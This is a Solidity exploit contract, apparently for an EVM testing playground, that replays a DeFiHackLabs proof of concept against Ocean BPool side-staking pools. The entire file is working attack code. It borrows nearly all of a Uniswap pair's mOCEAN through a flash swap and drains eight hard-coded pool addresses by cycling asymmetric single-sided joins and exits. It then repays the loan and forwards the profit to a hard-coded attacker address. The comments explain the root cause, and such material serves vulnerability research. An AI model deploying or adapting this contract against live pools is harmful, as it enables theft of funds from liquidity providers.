// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2026-06-OceanBPoolSideStaking).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// flash-swap callback `uniswapV2Call` lives on the test itself, so there is no
// standalone contract to deploy). This contract is a faithful, self-contained copy
// of that inline attack (testExploit + uniswapV2Call + drainPool + moceanPairReserve)
// so the playground can deploy it and record run(). Logic and constants are copied
// verbatim from src/test/2026-06/OceanBPoolSideStaking_exp.sol.
//
// Root cause: Ocean BPool's single-sided join/exit math is asymmetric, and
// SideStaking auto-mirrors each single-sided join/exit with datatoken staking, so
// repeatedly max-joining then exiting redeems more mOCEAN than was deposited.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IOceanBPool {
    function getBaseTokenAddress() external view returns (address);
    function getBalance(address token) external view returns (uint256);
    function joinswapExternAmountIn(uint256 tokenAmountIn, uint256 minPoolAmountOut) external returns (uint256);
    function exitswapPoolAmountIn(uint256 poolAmountIn, uint256 minAmountOut) external returns (uint256);
    function gulp(address token) external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract OceanDrain {
    address constant ATTACKER = 0x3Fa8cF7FeA68C8E76A9838d77889464DdFb6a6cf;
    address constant MOCEAN = 0x282d8efCe846A88B159800bd4130ad77443Fa1A1;
    address constant FLASH_PAIR = 0xEC554b30Ca0656Ea2404e85528C1d5F885e9E296;

    uint256 private constant FLASH_BORROW_BPS = 9_900;
    uint256 private constant BPS_DENOMINATOR = 10_000;
    uint256 private constant UNISWAP_FEE_NUMERATOR = 1_000;
    uint256 private constant UNISWAP_FEE_DENOMINATOR = 997;
    uint256 private constant MAX_DRAIN_STEPS = 16;
    uint256 private constant MIN_MOCEAN_PROFIT = 120_000 ether;

    IERC20 private constant mocean = IERC20(MOCEAN);
    IUniswapV2Pair private constant flashPair = IUniswapV2Pair(FLASH_PAIR);

    address[8] private pools = [
        0xe7832A036da14dC3BBcEc5F73a8193221E9F0DA5,
        0x2dd64bA8d9b9B1bB402Aa70214E1Fb1D7AF314a1,
        0x25faf893edCef3b1C94029f01a088448669fcB9a,
        0x1f5927CB77EA8449F0281ed14847A70d7A4f7053,
        0x56A5cf2fB3f5b12e6c4bC4C0f100800D3735E522,
        0x569C692125CF32bAF19E4ce713F9cf43e4c18c2C,
        0x95f57249e6DD394318025068a8BFC841ac6eC0DD,
        0x193F1cE9108644cD4d09C769d8DCD100F2B901D6
    ];

    // step 0: borrow nearly all mOCEAN from the UniswapV2 pair; callback does the drain.
    function run() external {
        uint256 borrowAmount = moceanPairReserve() * FLASH_BORROW_BPS / BPS_DENOMINATOR;
        require(borrowAmount > 0, "empty flash reserve");
        if (flashPair.token0() == MOCEAN) {
            flashPair.swap(borrowAmount, 0, address(this), bytes("mOCEAN flash swap"));
        } else {
            require(flashPair.token1() == MOCEAN, "unexpected pair");
            flashPair.swap(0, borrowAmount, address(this), bytes("mOCEAN flash swap"));
        }
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == FLASH_PAIR, "only flash pair");
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;

        // step 1: for each vulnerable pool, deposit mOCEAN, gulp the stale reserve, then exit BPT.
        for (uint256 i; i < pools.length; ++i) {
            drainPool(IOceanBPool(pools[i]));
        }

        // step 2: repay the flash swap and forward the remaining mOCEAN profit.
        uint256 repayment = borrowed * UNISWAP_FEE_NUMERATOR / UNISWAP_FEE_DENOMINATOR + 1;
        mocean.transfer(FLASH_PAIR, repayment);
        mocean.transfer(ATTACKER, mocean.balanceOf(address(this)));
    }

    function drainPool(IOceanBPool pool) private {
        require(pool.getBaseTokenAddress() == MOCEAN, "unexpected base token");
        mocean.approve(address(pool), type(uint256).max);

        // max single-sided mOCEAN joins mint asymmetric BPT + auto-stake datatokens
        uint256 joinSteps;
        while (mocean.balanceOf(address(this)) > 0 && joinSteps < MAX_DRAIN_STEPS) {
            uint256 maxIn = pool.getBalance(MOCEAN) / 2;
            if (maxIn > 0) --maxIn;
            uint256 amountIn = mocean.balanceOf(address(this));
            if (amountIn > maxIn) amountIn = maxIn;
            if (amountIn == 0) break;

            pool.joinswapExternAmountIn(amountIn, 0);
            ++joinSteps;
        }

        pool.gulp(MOCEAN);

        // exit the BPT back to mOCEAN — the asymmetric math returns more than deposited
        uint256 exitSteps;
        while (pool.balanceOf(address(this)) > 0 && exitSteps < MAX_DRAIN_STEPS) {
            uint256 maxPoolAmountIn = pool.totalSupply() / 4;
            uint256 poolAmountIn = pool.balanceOf(address(this));
            if (poolAmountIn > maxPoolAmountIn) poolAmountIn = maxPoolAmountIn;
            if (poolAmountIn == 0) break;

            pool.exitswapPoolAmountIn(poolAmountIn, 0);
            ++exitSteps;
        }
    }

    function moceanPairReserve() private view returns (uint256 reserve) {
        (uint112 reserve0, uint112 reserve1,) = flashPair.getReserves();
        reserve = flashPair.token0() == MOCEAN ? uint256(reserve0) : uint256(reserve1);
    }
}
